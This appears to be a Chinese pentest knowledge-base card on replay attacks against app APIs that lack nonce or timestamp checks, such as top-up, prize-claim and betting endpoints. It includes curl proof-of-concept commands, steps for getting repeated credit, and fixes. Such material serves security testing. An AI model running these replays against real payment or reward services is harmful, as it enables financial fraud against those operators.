---
title: 接口无 nonce / 时间戳 → 请求重放（充值、领奖、下注）
cve: 无（实现缺陷）
severity: high
cvss: 8.2
product: 自研 App/小程序 API
versions: 任意
ports: 80, 443
keywords: 重放, replay, nonce, 时间戳, 签名, 幂等
entry: 充值/领奖/下注接口缺 nonce 校验
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

- 请求头只有 `sign`/`timestamp`，无 `nonce`；或 timestamp 服务端不校验窗口；
- 同一请求发两次都成功。

## 前置条件

- 能抓包（App/小程序）；有一个可产生资金/权益变化的接口。

## PoC

```bash
# 1) 原样重放一次（不改任何字段）
curl -s -X POST https://target/api/lottery/claim -H 'Content-Type: application/json' \
  -H 'X-Sign: <sign>' -d '{"actId":1,"uid":1001}' -o /tmp/r1.json -w '%{http_code}\n'
curl -s -X POST https://target/api/lottery/claim -H 'Content-Type: application/json' \
  -H 'X-Sign: <sign>' -d '{"actId":1,"uid":1001}' -o /tmp/r2.json -w '%{http_code}\n'
diff /tmp/r1.json /tmp/r2.json && echo "两次都成功 = 可重放"

# 2) 改 timestamp 为旧值，看服务端是否校验窗口
curl -s -X POST https://target/api/lottery/claim -H 'X-Sign: <sign>' \
  -H 'X-Timestamp: 1700000000' -d '{"actId":1,"uid":1001}' -w '%{http_code}\n'
# 判定：旧时间戳仍 200 = 缺时间窗口校验
```

## 利用步骤

1. 先原样重放（最稳），看是否重复到账；
2. 再试旧时间戳/改 nonce 为空；
3. 命中即"可无限重放"——资金面，写清影响；
4. 证据：两次响应 + 余额变化。

## 修复与缓解

- 服务端维护 nonce 缓存（一次性）+ timestamp ±5 分钟窗口；
- 资金类请求幂等键（bizId）去重。

## 参考

- OWASP API Security；CWE-294。
